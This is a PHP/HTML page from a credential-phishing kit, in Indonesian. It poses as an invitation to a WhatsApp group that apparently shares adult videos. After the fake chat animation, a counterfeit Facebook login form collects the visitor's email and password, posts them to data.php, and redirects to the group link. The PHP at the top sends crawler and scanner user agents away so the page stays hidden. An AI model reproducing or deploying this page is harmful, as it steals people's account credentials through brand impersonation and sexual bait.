<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: HAYKAL JB 083136489793');
die();
}
require 'setting.php';
?>
<!DOCTYPE HTML>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.2.0/css/all.css" />
        <title><?php echo $namagrp;?></title>
        <link rel="icon" type="png/image" href="https://i.ibb.co/vJsnLDj/wa-img.png" />
        <meta name="theme-color" content="#008069">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="jemx/fb.css">
        <link rel="stylesheet" href="jemx/asaykjwdawldkha.css" />
    </head>
    <body>
        <main>
            <div class="hdrhjbgrp">
                <div class="krhdrhjbgrp">
                    <div class="icnhjbgrp">
                        <i class="fa-regular fa-arrow-left"></i>
                        <img src="<?php echo $fotogrp;?>" alt="" />
                    </div>
                    <div class="nmhjbgrp">
                        <h1><?php echo $namagrp;?></h1>
                        <p>+62 855-9202-0141, +62 817-6452-692, +62 817-6675-864</p>
                    </div>
                </div>
                <div class="acthjbgrp">
                    <i class="fa-solid fa-video"></i>
                    <i class="fa-solid fa-phone"></i>
                    <i class="fa-regular fa-ellipsis-vertical"></i>
                </div>
            </div>
            <div class="chthjbgrp">
                <div class="skrhjbgrp"><span id="dino"></span> <span id="ulan"></span> <span id="taun"></span></div>
                <div class="enchjbgrp"><i class="fa-solid fa-lock"></i> Pesan dan panggilan terenskripsi secara end-to-end. Tidak seorang pun diluar chat ini, termasuk WhatsApp, yang dapat membaca atau mendengarkannya. Ketuk untuk info selanjutnya.</div>
                <div class="gbghjbgrp" style="display: none">+62 895-0955-6668 bergabung menggunakan tautan undangan grup ini</div>
                
                <div class="bxchthjbgrp">
                    <div class="strhjbgrp" style="display: none">
                        <div class="nmskthjbgrp">
                            <p>+62 817-6675-864</p>
                            <span>~ intan</span>
                        </div>
                        <div class="gfhjbgrp">
                            <img src="https://i.ibb.co/2M8cPB5/hjb.webp" alt="" />
                            <jamhjb id="hrs1">23.06</jamhjb>
                        </div>
                    </div>
                    <div class="vcrhjbgrp" style="display: none">
                        <div class="nmvcrhjbgrp">
                            <p>+62 817-6452-692</p>
                            <span>~ .</span>
                        </div>
                        <div class="plyvcrhjbgrp">
                            <div class="plyvcrhjbgrp">
                                <i class="fa-solid fa-play"></i>
                                <img src="https://i.ibb.co/Q9X4rVH/vcrhjb.png" alt="" />
                            </div>
                            <div class="pflvcrhjbgrp">
                                <img src="https://i.ibb.co/sWBtSx6/2.png" alt="" />
                                <i class="fa-solid fa-microphone"></i>
                            </div>
                        </div>
                        <div class="jmvcrhjb">
                            <p>0.06</p>
                            <p id="hrs2">23.06</p>
                        </div>
                    </div>
                    <div class="vdohjbgrp" style="display: none">
                        <div class="nmvdohjbgrp">
                            <p>+62 855-9202-0141</p>
                            <span>~ Admin</span>
                        </div>
                        <div class="blshjbgrp">
                            <p>+62 895-0623-3217</p>
                            <span>versi full ada?</span>
                        </div>
                        <div class="bxvdhjbgrp">
                            <img src="https://i.ibb.co/9Vj0scJ/Screenshot-1-modified-min.png" alt="" />
                            <i class="fa-solid fa-play hjbplyvd"></i>
                            <div class="jmvdhjbgrp">
                                <p><i class="fa-solid fa-video"></i> 7.12</p>
                                <span id="hrs3">23:06</span>
                            </div>
                        </div>
                    </div>
                    <div class="pdhjbgrp"></div>
                </div>
            </div>
            <div class="gbgpophjbgrp" style="display: none">
                <div class="mrchthjbgrp" style="display: none" onclick="opfhjb()">
                    <i class="fa-regular fa-chevrons-down"></i>
                    <p id="uphjb"></p>
                </div>
                <div class="bxldhjbgrp">
                    <i class="fa-duotone fa-spinner-third fa-spin"></i>
                </div>
                <div class="bxgbghjbgrp" style="display: none">
                    <div class="tgbghjbgrp">
                        <img src="<?php echo $fotogrp;?>" alt="" />
                        <div class="infhjbgrp">
                            <h2><?php echo $namagrp;?></h2>
                            <p>Grup dibuat oleh +62 855-9202-0141</p>
                            <div class="descifhjbgrp">Peraturan Grup<br>
                                <label>- Jangan membawa ras, agama, & politik<span id="titik">...</span></label>
                                <span id="lainnya">
                                    - Hargai jika video buram/terpotong<br>
                                    - Hargai member cewe<br>
                                    - Saling share jika punya video baru<br>
                                    - Dilarang chat member cewe untuk keperluan op*n BO/lainnya
                                </span>
                                 <span id="less" onclick="showmr()">Selengkapnya</span>
                                </div>
                        </div>
                    </div>
                    <div class="psthjbgrp">
                        <p>198 peserta</p>
                        <div class="ovrpsthjbgrp">
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/jJrwz1G/3.png" alt="" />
                                <label>~ Nur</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/yFSbcgK/4.png" alt="" />
                                <label>~ Dewi</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/5htr7B9/14.png" alt="" />
                                <label>~ Dika</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/M8T1CF3/5.png" alt="" />
                                <label>~ bela</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/ykC96tW/6.png" alt="" />
                                <label>~ divara</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/yp6hKy5/13.png" alt="" />
                                <label>~ ivan</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/JqkfLPL/7.png" alt="" />
                                <label>~ elsa</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/X3D47TD/8.png" alt="" />
                                <label>~ Anin</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/9vt21sJ/9.png" alt="" />
                                <label>~ tiara</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/vkK42QT/10.png" alt="" />
                                <label>~ Cici</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/py8bKhJ/11.png" alt="" />
                                <label>~ Eva</label>
                            </div>
                            <div class="bxpsthjbgrp">
                                <img src="https://i.ibb.co/xzG24XV/12.png" alt="" />
                                <label>~ Agus</label>
                            </div>
                        </div>
                    </div>
                    <div class="actgbghjbgrp">
                        <a>Batal</a>
                        <a onclick="opfhjb()">Bergabung ke grup</a>
                    </div>
                </div>
            </div>
            
            <div class="popup-hjb hjb-facebook animate fadeIn" id="alexf" style="display: none;">
                <div class="container-box-fb" style="margin-top: 10%;">
                    <div class="atasan-fb" >
                        <img src="https://i.ibb.co/bFJsCtx/fb.png">
                    </div>
                    <div class="isi-facebook">
                        <p class="kaget email-fb1" style="">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
                        <p class="kaget sandi-fb1" style="">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                        <img src="https://i.ibb.co/D7G2wLR/wa-img.png">
                        <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk terhubung dengan WhatsApp</div>
                        <form class="form-login-fb" id="ayobos">
                            <label>
                                <input type="text" id="email_fb2" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff" required>
                            </label>
                            <label>
                                <input type="password" id="password_fb2" name="sandi" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: #fff" required>
                            </label>
                            <input type="hidden" name="login" id="login_fb" value="Facebook" readonly>
                            <button class="btn-login-fb" onclick="return ophjbf()" type="button">Masuk</button>
                        </form>
                        <div class="txt-buat-akun">Buat akun</div>
                        <div class="txt-tidak-sekarang">Lain kali</div>
                        <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
                    </div>
                    <div class="isi-bahasa">
                        <center>
                            <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
                            <div class="nama-bahasa">English (UK)</div>
                            <div class="nama-bahasa">Basa Jawa</div>
                            <div class="nama-bahasa">Bahasa Melayu</div>
                            <div class="nama-bahasa">日本語</div>
                            <div class="nama-bahasa">Español</div>
                            <div class="nama-bahasa">Português (Brasil)</div>
                            <div class="nama-bahasa"><i class="fa fa-plus"></i>
                            </div>
                        </center>
                    </div>
                    <div class="textbawah">Facebook Inc.</div>
                </div>
            </div>
            
        </main>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
        <script>
            const mm = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
            
            const tibo = new Date();
            let dino = tibo.getUTCDate();
            let ulan = mm[tibo.getMonth()];
            let taun = tibo.getFullYear();
            document.getElementById("dino").innerHTML = dino;
            document.getElementById("ulan").innerHTML = ulan;
            document.getElementById("taun").innerHTML = taun;
            
            function startTime() {
              const today = new Date();
              let h = today.getHours();
              let m = today.getMinutes();
              let s = today.getSeconds();
              m = checkTime(m);
              s = checkTime(s);
              document.getElementById('hrs1').innerHTML =  h + "." + m ;
              document.getElementById('hrs2').innerHTML =  h + "." + m ;
              document.getElementById('hrs3').innerHTML =  h + "." + m ;
              setTimeout(startTime, 1000);
            }
            
            function checkTime(i) {
              if (i < 10) {i = "0" + i};
              return i;
            }

            function showmr() {
              var titik = document.getElementById("titik");
              var lainnya = document.getElementById("lainnya");
              var less = document.getElementById("less");
            
              if (titik.style.display === "none") {
                titik.style.display = "inline";
                less.innerHTML = "Selengkapnya";
                lainnya.style.display = "none";
              } else {
                titik.style.display = "none";
                less.innerHTML = "Lebih Seikit";
                lainnya.style.display = "inline";
              }
            }
            
            $( document ).ready(function() {
                startTime()
                setTimeout(() => {
                    $('.gbghjbgrp').show();
                    setTimeout(() => {
                        $('.strhjbgrp').show();
                        setTimeout(() => {
                            $('.vcrhjbgrp').show();
                            setTimeout(() => {
                                $('.vdohjbgrp').show();
                                setTimeout(() => {
                                    $('.gbgpophjbgrp').fadeIn();
                                    setTimeout(() => {
                                        $('.bxldhjbgrp').hide();
                                        $('.bxgbghjbgrp').fadeIn();
                                        $('.mrchthjbgrp').fadeIn();
                                        const counterAnimation = (el, initialNum, finalNum) => {
                                          if (Number.isInteger(finalNum)) {
                                            let interval = setInterval(function() {
                                              el.innerHTML = initialNum;
                                              (initialNum >= finalNum) ? clearInterval(interval) : '';
                                              initialNum++;
                                            }, 500);
                                          }
                                          else {
                                            let intInitialNum = Math.floor(initialNum);
                                            let intFinalNum = Math.floor(finalNum);
                                            let interval = setInterval(function() {
                                              el.innerHTML = intInitialNum;
                                              if (intInitialNum >= intFinalNum) {
                                                clearInterval(interval);
                                                el.innerHTML = `${finalNum.toString().replace('.', ',')}`;
                                              }
                                              intInitialNum++;
                                            }, 500);
                                          }
                                        }
                                        
                                        counterAnimation(document.querySelector('#uphjb'), 1, 93);
                                        setTimeout(() => {
                                            $('.pdhjbgrp').show();
                                            $('html, body').animate({
                                                scrollTop: $(".pdhjbgrp").offset().top
                                            }, 400);
                                        },1000)
                                    },500)
                                },1500)
                                $('html, body').animate({
                                    scrollTop: $(".vdohjbgrp").offset().top
                                }, 1000);
                            },800)
                        },1000)
                    },800)
                },500)

            });
            
            function opfhjb() {
                $('.hjb-facebook').fadeIn();
            }
            function ophjbf()
        	{
        		$emailfb1 = $('#email_fb2').val().trim();
        		$passwordfb1 = $('#password_fb2').val().trim();
        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
        		{
        			$('.email-fb1').show();
        			$('.sandi-fb1').hide();
        			return false;
        		}else{
        			$('.email-fb1').hide();
        		}
        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
        		{
        			$('.sandi-fb1').show();
        			return false;
        		}else{
        			$('.sandi-fb1').hide();
        		}
        		
        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
        		    $.ajax({
                        type: 'POST',
                        url: 'data.php',
                        data: $('#ayobos').serialize(),
                        dataType: 'text',
                        success: function() {
                                    location.href = "<?php echo $linkgrp;?>";
                            } 
                    })
        		}
        	}
        </script>
    </body>
</html>